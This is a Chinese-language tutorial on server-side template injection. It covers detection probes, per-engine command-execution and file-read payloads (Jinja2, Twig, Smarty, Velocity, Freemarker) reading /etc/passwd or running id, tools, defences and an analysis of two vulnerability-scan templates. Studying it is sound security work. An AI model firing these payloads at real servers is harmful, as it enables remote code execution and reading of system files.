# 服务端模板注入 (SSTI)

> 模板注入允许攻击者将模板代码注入到现有（或新建）的模板中。模板引擎通过使用静态模板文件，在运行时用实际值替换HTML页面中的变量/占位符，使HTML页面设计更加容易。

## 目录

- [工具](#工具)
- [方法论](#方法论)
    - [识别易受攻击的输入字段](#识别易受攻击的输入字段)
    - [注入模板语法](#注入模板语法)
    - [枚举模板引擎](#枚举模板引擎)
    - [利用模板注入](#利用模板注入)
- [常见模板引擎的利用](#常见模板引擎的利用)
    - [Jinja2](#jinja2)
    - [Twig](#twig)
    - [Smarty](#smarty)
    - [Velocity](#velocity)
    - [Freemarker](#freemarker)
- [防御措施](#防御措施)
- [学习资源](#学习资源)

## 什么是SSTI？

服务端模板注入（SSTI）是一种安全漏洞，当攻击者能够将恶意模板代码注入到Web应用程序中时发生。这种漏洞通常出现在应用程序使用模板引擎渲染用户提供的数据时，没有正确清理用户输入。

## 识别易受攻击的输入字段

1. **查找用户输入点**
   - URL参数
   - 表单字段
   - HTTP头
   - Cookie
   - 文件上传

2. **测试模板注入**
   - 尝试基本的数学运算：`{{ 7*7 }}`
   - 尝试访问内置对象：`{{ self }}`
   - 尝试访问全局变量：`{{ config }}`

## 枚举模板引擎

不同的模板引擎有不同的语法和内置对象。以下是识别模板引擎的一些方法：

1. **Jinja2**
   ```
   {{ 7*'7' }}  # 返回 '7777777'
   {{ config.items() }}  # 返回配置项
   ```

2. **Twig**
   ```
   {{ _self }}  # 返回当前模板
   {{ _self.env }}  # 访问环境
   ```

3. **Smarty**
   ```
   {php}phpinfo(){/php}
   {$smarty.version}
   ```

## 常见模板引擎的利用

### Jinja2

```python
# 读取文件
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# 执行命令
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Twig

```php
# 读取文件
{{ _self.env.getFilter('file')().getContents('/etc/passwd') }}

# 执行命令
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter('id') }}
```

### Smarty

```smarty
{php}system('id');{/php}
{system('cat /etc/passwd')}
```

### Velocity

```velocity
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```

### Freemarker

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

## 自动化工具

- [tplmap](https://github.com/epinna/tplmap) - 自动检测和利用SSTI漏洞的工具
- [SSTI-Payloads](https://github.com/payloadbox/ssti-payloads) - 各种模板引擎的SSTI有效载荷集合
- [Jinja2 SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) - Jinja2特定的SSTI有效载荷

## 防御措施

1. **输入验证**
   - 对所有用户输入进行严格的验证
   - 使用白名单而不是黑名单

2. **沙箱**
   - 在沙箱环境中执行模板
   - 限制对敏感函数和对象的访问

3. **使用安全配置**
   - 禁用危险函数
   - 使用最新版本的模板引擎
   - 应用最小权限原则

4. **输出编码**
   - 对输出进行适当的编码
   - 使用自动转义功能

## 学习资源

- [PortSwigger SSTI 实验室](https://portswigger.net/web-security/server-side-template-injection)
- [OWASP SSTI 防御指南](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html)
- [SSTI 备忘单](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

## 免责声明

本文档仅用于教育目的。请勿将其用于非法活动。在进行安全测试时，请确保您已获得适当的授权。

* [模板注入攻防 | Pwn
Tricks](https://pwn-tricks.com/backend/template-injection)

---

## 八、典型漏洞 YAML 文件分析

本目录收录了多个与 SSTI（服务器端模板注入）相关的漏洞利用模板，以下对部分典型 YAML 文件进行详细解读：

### 1. CVE-2022-22954.yaml
- **漏洞类型**：SSTI（VMware Workspace ONE Access）
- **漏洞原理**：
  VMware Workspace ONE Access 存在模板注入漏洞，攻击者可通过特制请求注入恶意模板表达式，最终实现远程代码执行。
- **探测原理**：
  该模板通过 GET 请求注入 Freemarker 模板 payload，该 payload 会尝试执行 `id` 命令。如果响应中包含了 `uid=`、`gid=` 和 `groups=` 等命令执行结果的关键字，则判定漏洞存在。
- **修复建议**：立即升级 VMware Workspace ONE Access 至官方修复版本。

### 2. pdf-signer-ssti-to-rce.yaml
- **漏洞类型**：SSTI（PDF Signer 3.0）
- **漏洞原理**：
  PDF Signer 3.0 在处理 Cookie 时存在 Twig 模板注入漏洞。攻击者可通过构造恶意的 Cookie，在模板渲染时执行任意 PHP 代码。
- **探测原理**：
  该模板在 Cookie 中注入一个 Twig SSTI payload，该 payload 利用 `_self.env.registerUndefinedFilterCallback("shell_exec")` 和 `_self.env.getFilter("cat /etc/passwd")` 来执行 `cat /etc/passwd` 命令。如果响应体中包含了 `root:x:0:0` 等典型 passwd 文件内容，则判定漏洞存在。
- **修复建议**：修复模板渲染逻辑，对所有用户可控的输入（包括 Cookie）进行严格的过滤和转义。

---

#### 总结
SSTI 漏洞的根源在于将用户输入不经处理地作为模板内容的一部分进行渲染。攻击者可以利用模板引擎提供的强大功能（如访问对象、执行函数）从数据渲染上下文逃逸到代码执行上下文。防御措施包括：
- **避免动态模板**：尽可能不让用户输入影响模板文件的结构。
- **沙箱与逻辑分离**：在无法避免动态模板时，使用安全的沙箱环境执行模板渲染，并确保渲染逻辑与业务逻辑分离。
- **严格的输入过滤**：对传入模板的数据进行严格的白名单校验和上下文感知的转义。
- **更新组件**：及时更新模板引擎至最新版本，以修复已知的安全漏洞。
